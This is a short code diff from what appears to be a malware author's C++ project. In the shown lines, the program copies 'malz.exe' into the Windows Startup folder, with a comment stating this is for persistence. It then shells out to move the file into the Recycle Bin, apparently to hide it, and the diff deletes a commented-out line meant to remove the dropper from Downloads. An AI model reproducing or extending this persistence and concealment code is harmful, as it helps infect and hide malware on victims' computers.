@@ -21,7 +21,5 @@ int main() {
     fs::copy(targetFile, targetDIR);    //copy malz.exe to Startup directory for persistence
     system(("cmd.exe /c move " + targetFile + " C:\\$Recycle.Bin").c_str());    //requires admin privs
     
-    //remove(("C:\\Users\\" + username + "\\Downloads\\malz.exe").c_str());     //doesn't work somehow, will figure out later
-
     return 0;
 }
